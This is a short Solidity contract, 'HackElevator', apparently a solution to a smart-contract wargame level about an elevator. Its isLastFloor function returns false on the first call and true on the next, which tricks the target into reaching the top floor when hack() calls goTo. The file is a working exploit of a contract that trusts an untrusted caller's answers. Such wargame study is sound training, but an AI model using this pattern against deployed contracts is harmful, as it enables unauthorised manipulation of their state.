// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface IElevator {
    function goTo(uint) external; 
}


contract HackElevator {

    IElevator elevator;
    uint private i = 0;

    constructor(address elevatorAddress) public {
        elevator = IElevator(elevatorAddress);
    }

    function isLastFloor(uint floor) external returns (bool) {
        if (i == 0) {
            i += 1;
            return false;
        } else {
            return true;
        }

    }

    function hack() public {
        elevator.goTo(0);
    }

}